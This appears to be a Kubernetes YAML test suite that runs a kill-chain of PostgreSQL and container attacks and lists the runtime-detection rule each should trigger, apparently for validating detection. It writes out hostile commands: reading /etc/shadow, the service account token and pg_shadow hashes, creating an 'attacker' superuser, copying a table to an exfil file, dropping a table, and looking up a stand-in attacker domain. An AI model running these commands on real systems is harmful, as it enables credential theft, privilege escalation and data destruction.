apiVersion: bobctl.k8sstormcenter.io/v1alpha1
kind: AttackSuite
metadata:
  name: postgres-killchain-attacks
  description: >-
    Kill-chain ordered PostgreSQL attack suite (24 attacks) using TWO delivery
    mechanisms: SQL-based attacks via psql (exploiting database access) and
    kubectl exec post-exploitation. Covers MITRE ATT&CK for Containers phases
    from Reconnaissance through Impact. Maps to OWASP A01 (Broken Access
    Control), A03 (Injection), A04 (Insecure Design), A05 (Misconfiguration),
    A07 (Auth Failures). Attacks execute from the pg-client pod.
target:
  service: pg-client
  namespace: postgres
  port: 5432

attacks:
  # ═══════════════════════════════════════════════════════════════════════════
  # Phase 1: RECONNAISSANCE (TA0043) — Database enumeration
  # ═══════════════════════════════════════════════════════════════════════════

  # T1082 — System Information Discovery (DB settings)
  - name: sql-dump-settings
    type: sqli
    exec:
      command: ["psql", "-h", "pg-rw", "-U", "app", "-d", "app", "-tAc",
                "SELECT name, setting FROM pg_settings WHERE name LIKE '%password%' OR name LIKE '%auth%';"]
    expectedDetections: []

  # T1083 — File and Directory Discovery (table enumeration)
  - name: sql-dump-all-tables
    type: sqli
    exec:
      command: ["psql", "-h", "pg-rw", "-U", "app", "-d", "app", "-tAc",
                "SELECT schemaname, tablename FROM pg_tables WHERE schemaname NOT IN ('pg_catalog','information_schema');"]
    expectedDetections: []

  # T1082 — System Information Discovery (schema dump)
  - name: exec-pg-dump-schema
    type: cmdinject
    exec:
      command: ["pg_dump", "-h", "pg-rw", "-d", "app", "--schema-only"]
    expectedDetections:
      - ruleID: R0001
        ruleName: Unexpected process launched
        containerName: pg-client
        command: pg_dump

  # ═══════════════════════════════════════════════════════════════════════════
  # Phase 3: EXECUTION (TA0002) — Command execution
  # ═══════════════════════════════════════════════════════════════════════════

  # T1059.004 — Unix Shell (whoami)
  - name: exec-whoami
    type: cmdinject
    exec:
      command: ["whoami"]
    expectedDetections:
      - ruleID: R0001
        ruleName: Unexpected process launched
        containerName: pg-client
        command: whoami

  # T1059.004 — Unix Shell (exec from /dev/shm)
  - name: exec-devshm
    type: cmdinject
    exec:
      command: ["sh", "-c", "cp /bin/echo /dev/shm/malicious_pg && chmod +x /dev/shm/malicious_pg && /dev/shm/malicious_pg pwned && rm -f /dev/shm/malicious_pg"]
    expectedDetections:
      - ruleID: R1000
        ruleName: Exec from malicious source
        containerName: pg-client

  # ═══════════════════════════════════════════════════════════════════════════
  # Phase 5: PRIVILEGE ESCALATION (TA0004) — SQL-based priv esc
  # ═══════════════════════════════════════════════════════════════════════════

  # T1078.004 — Valid Accounts: Create superuser
  - name: sql-create-superuser
    type: sqli
    exec:
      command: ["psql", "-h", "pg-rw", "-U", "app", "-d", "app", "-tAc",
                "CREATE ROLE attacker WITH SUPERUSER LOGIN PASSWORD 'pwned';"]
    expectedDetections: []

  # T1611 — Escape to Host (unshare attempt)
  - name: exec-unshare
    type: cmdinject
    exec:
      command: ["sh", "-c", "unshare -r id 2>&1 || echo unshare_blocked"]
    expectedDetections:
      - ruleID: R1006
        ruleName: Kernel Module Load
        containerName: pg-client

  # ═══════════════════════════════════════════════════════════════════════════
  # Phase 6: DEFENSE EVASION (TA0005) — Cover tracks
  # ═══════════════════════════════════════════════════════════════════════════

  # T1036 — Masquerading: drifted binary
  - name: exec-drifted-binary
    type: cmdinject
    exec:
      command: ["sh", "-c", "cp /bin/ls /tmp/drifted_pg && /tmp/drifted_pg /etc && rm -f /tmp/drifted_pg"]
    expectedDetections:
      - ruleID: R1001
        ruleName: Exec Binary Not In Base Image
        containerName: pg-client

  # ═══════════════════════════════════════════════════════════════════════════
  # Phase 7: CREDENTIAL ACCESS (TA0006) — Steal credentials
  # ═══════════════════════════════════════════════════════════════════════════

  # T1552.001 — Credentials in Files: pg_shadow dump
  - name: sql-dump-pg-shadow
    type: sqli
    exec:
      command: ["psql", "-h", "pg-rw", "-U", "app", "-d", "app", "-tAc",
                "SELECT usename, passwd FROM pg_shadow;"]
    expectedDetections: []

  # T1552.001 — Credentials in Files: SA token
  - name: exec-sa-token
    type: cmdinject
    exec:
      command: ["cat", "/var/run/secrets/kubernetes.io/serviceaccount/token"]
    expectedDetections:
      - ruleID: R0006
        ruleName: Unexpected Service Account Token Access
        containerName: pg-client
        command: cat

  # T1552.001 — Credentials in Files: /etc/shadow
  - name: exec-etc-shadow
    type: cmdinject
    exec:
      command: ["cat", "/etc/shadow"]
    expectedDetections:
      - ruleID: R0010
        ruleName: Unexpected Sensitive File Access
        containerName: pg-client
        command: cat

  # T1552.001 — Credentials in Files: /etc/passwd
  - name: exec-etc-passwd
    type: cmdinject
    exec:
      command: ["cat", "/etc/passwd"]
    expectedDetections:
      - ruleID: R0001
        ruleName: Unexpected process launched
        containerName: pg-client
        command: cat

  # T1552 — Symlink to access sensitive file
  - name: exec-symlink
    type: cmdinject
    exec:
      command: ["sh", "-c", "ln -sf /etc/shadow /tmp/shadow_link && cat /tmp/shadow_link && rm -f /tmp/shadow_link"]
    expectedDetections:
      - ruleID: R1010
        ruleName: Symlink Created Over Sensitive File
        containerName: pg-client

  # T1552.001 — Read pg_hba.conf via SQL
  - name: sql-read-pg-hba
    type: cmdinject
    exec:
      command: ["psql", "-h", "pg-rw", "-U", "app", "-d", "app", "-tAc",
                "SELECT pg_read_file('/var/lib/postgresql/data/pgdata/pg_hba.conf');"]
    expectedDetections: []

  # T1552.001 — Read /etc/passwd via SQL
  - name: sql-read-etc-passwd
    type: cmdinject
    exec:
      command: ["psql", "-h", "pg-rw", "-U", "app", "-d", "app", "-tAc",
                "SELECT pg_read_file('/etc/passwd');"]
    expectedDetections: []

  # ═══════════════════════════════════════════════════════════════════════════
  # Phase 8: DISCOVERY (TA0007) — Environment enumeration
  # ═══════════════════════════════════════════════════════════════════════════

  # T1082 — System Information Discovery: /proc/environ
  - name: exec-proc-environ
    type: cmdinject
    exec:
      command: ["cat", "/proc/1/environ"]
    expectedDetections:
      - ruleID: R0008
        ruleName: Read Environment Variables from procfs
        containerName: pg-client
        command: cat

  # T1046 — Network Service Discovery: resolv.conf and hosts
  - name: exec-net-recon
    type: cmdinject
    exec:
      command: ["sh", "-c", "cat /etc/resolv.conf && cat /etc/hosts && getent hosts kubernetes.default.svc || true"]
    expectedDetections:
      - ruleID: R0001
        ruleName: Unexpected process launched
        containerName: pg-client
        command: cat

  # ═══════════════════════════════════════════════════════════════════════════
  # Phase 10: COLLECTION (TA0009) — Data staging
  # ═══════════════════════════════════════════════════════════════════════════

  # T1005 — Data from Local System: large object import
  - name: sql-large-object-import
    type: cmdinject
    exec:
      command: ["psql", "-h", "pg-rw", "-U", "app", "-d", "app", "-tAc",
                "SELECT lo_import('/etc/hostname');"]
    expectedDetections: []

  # T1074 — Data Staged: COPY TO file
  - name: sql-copy-exfil
    type: sqli
    exec:
      command: ["psql", "-h", "pg-rw", "-U", "app", "-d", "app", "-tAc",
                "COPY (SELECT * FROM bobtest) TO '/tmp/exfil.csv';"]
    expectedDetections: []

  # ═══════════════════════════════════════════════════════════════════════════
  # Phase 11: EXFILTRATION (TA0010) — DNS exfiltration
  # ═══════════════════════════════════════════════════════════════════════════

  # T1048 — Exfiltration Over Alternative Protocol: DNS beacon
  - name: exec-dns-anomaly
    type: cmdinject
    exec:
      command: ["sh", "-c", "getent hosts evil.attacker.example.com || echo dns_failed"]
    expectedDetections:
      - ruleID: R0005
        ruleName: Unexpected domain request
        containerName: pg-client

  # ═══════════════════════════════════════════════════════════════════════════
  # Phase 12: IMPACT (TA0040) — Data destruction and crypto mining
  # ═══════════════════════════════════════════════════════════════════════════

  # T1485 — Data Destruction: DROP TABLE
  - name: sql-drop-table
    type: sqli
    exec:
      command: ["psql", "-h", "pg-rw", "-U", "app", "-d", "app", "-tAc",
                "DROP TABLE IF EXISTS bobtest_exfil;"]
    expectedDetections:
      - ruleID: R0001
        ruleName: Unexpected process launched
        containerName: pg-client
        command: psql

  # T1496 — Resource Hijacking: crypto mining DNS signal
  - name: exec-crypto-dns
    type: cmdinject
    exec:
      command: ["sh", "-c", "getent hosts xmr.pool.minergate.com || echo mining_dns_failed"]
    expectedDetections:
      - ruleID: R1008
        ruleName: Crypto Mining Domain Communication
        containerName: pg-client
